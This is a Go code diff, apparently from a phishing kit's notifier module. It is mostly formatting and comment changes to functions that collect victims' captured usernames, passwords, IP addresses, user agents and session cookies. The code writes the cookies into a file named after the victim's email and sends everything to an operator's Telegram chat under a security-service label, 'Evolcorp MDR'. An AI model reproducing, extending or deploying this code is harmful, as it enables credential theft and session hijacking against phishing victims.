@@ -6,9 +6,9 @@ import (
 	"math/rand"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
-
 )
 
 type Token struct {
@@ -23,7 +23,7 @@ type Token struct {
 	Session          bool        `json:"session"`
 	FirstPartyDomain string      `json:"firstPartyDomain"`
 	PartitionKey     interface{} `json:"partitionKey"`
-	ExpirationDate   *int64       `json:"expirationDate,omitempty"`
+	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
 	StoreID          interface{} `json:"storeId"`
 }
 
@@ -35,7 +35,6 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 			var t Token
 
 			if name, ok := tokenData["Name"].(string); ok {
-				// Remove &
 				t.Name = name
 			}
 			if val, ok := tokenData["Value"].(string); ok {
@@ -71,15 +70,14 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 			if pk, ok := tokenData["PartitionKey"]; ok {
 				t.PartitionKey = pk
 			}
-			
 			if storeID, ok := tokenData["storeId"]; ok {
 				t.StoreID = storeID
 			} else if storeID, ok := tokenData["StoreID"]; ok {
 				t.StoreID = storeID
 			}
 
-			t.ExpirationDate = nil // Remove expirationDate field
-
+			// Remove expirationDate field
+			t.ExpirationDate = nil
 
 			tokens = append(tokens, t)
 		}
@@ -114,7 +112,6 @@ func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string
 	return consolidatedTokens, nil
 }
 
-
 // Define a map to store session IDs and a mutex for thread-safe access
 var processedSessions = make(map[string]bool)
 var sessionMessageMap = make(map[string]int)
@@ -130,8 +127,9 @@ func generateRandomString() string {
 	}
 	return string(randomStr)
 }
+
 func createTxtFile(session Session) (string, error) {
-	// Create a random text file name
+	// Create a text file name based on the email and timestamp
 	safeEmail := strings.ReplaceAll(session.Username, "@", "_")
 	safeEmail = strings.ReplaceAll(safeEmail, ".", "_")
 	timestamp := time.Now().Format("20060102_150405") // YYYYMMDD_HHMMSS format
@@ -169,7 +167,6 @@ func createTxtFile(session Session) (string, error) {
 	result, err := json.MarshalIndent(allTokens, "", "  ")
 	if err != nil {
 		fmt.Println("Error marshalling final tokens:", err)
-
 	}
 
 	fmt.Println("Combined Tokens: ", string(result))
@@ -186,22 +183,23 @@ func createTxtFile(session Session) (string, error) {
 func formatSessionMessage(session Session) string {
 	// Format the session information (no token data in message)
 	return fmt.Sprintf("🔐 Evolcorp MDR 🔐\n\n"+
-	    "👤 Username:      🪤 %s\n"+
-	    "🔑 Password:      🪤 %s\n"+
-	    "🌐 Landing URL:   🪤 %s\n \n"+
-	    "🖥️ User Agent:    🪤 %s\n"+
-	    "🌍 Remote Address:🪤 %s\n"+
-	    "🕒 Create Time:   🪤 %d\n"+
-	    "\n"+
-	    "📦 Token Delivery. 🍪 incoming.\n",
-	    session.Username,
-	    session.Password,
-	    session.LandingURL,
-	    session.UserAgent,
-	    session.RemoteAddr,
-	    session.CreateTime
+		"👤 Username:      🪤 %s\n"+
+		"🔑 Password:      🪤 %s\n"+
+		"🌐 Landing URL:   🪤 %s\n \n"+
+		"🖥️ User Agent:    🪤 %s\n"+
+		"🌍 Remote Address:🪤 %s\n"+
+		"🕒 Create Time:   🪤 %d\n"+
+		"\n"+
+		"📦 Token Delivery. 🍪 incoming.\n",
+		session.Username,
+		session.Password,
+		session.LandingURL,
+		session.UserAgent,
+		session.RemoteAddr,
+		session.CreateTime,
 	)
 }
+
 func Notify(session Session) {
 	config, err := loadConfig()
 	if err != nil {
@@ -210,7 +208,6 @@ func Notify(session Session) {
 	}
 
 	mu.Lock()
-	// Check if the session is already processed
 	if processedSessions[string(session.ID)] {
 		mu.Unlock()
 		messageID, exists := sessionMessageMap[string(session.ID)]
@@ -226,27 +223,20 @@ func Notify(session Session) {
 				fmt.Printf("Error editing message: %v\n", err)
 			}
 			os.Remove(txtFilePath)
-		} else {
-			fmt.Println("Message ID not found for session:", session.ID)
 		}
 		return
 	}
 
-	// Mark session as processed
 	processedSessions[string(session.ID)] = true
 	mu.Unlock()
 
-	// Create the TXT file for the original message
 	txtFilePath, err := createTxtFile(session)
 	if err != nil {
 		fmt.Println("Error creating TXT file:", err)
 		return
 	}
 
-	// Format the message
 	message := formatSessionMessage(session)
-
-	// Send the notification and get the message ID
 	messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
 	if err != nil {
 		fmt.Printf("Error sending Telegram notification: %v\n", err)
@@ -254,11 +244,9 @@ func Notify(session Session) {
 		return
 	}
 
-	// Map the session ID to the message ID
 	mu.Lock()
 	sessionMessageMap[string(session.ID)] = messageID
 	mu.Unlock()
 
-	// Remove the temporary TXT file
 	os.Remove(txtFilePath)
 }
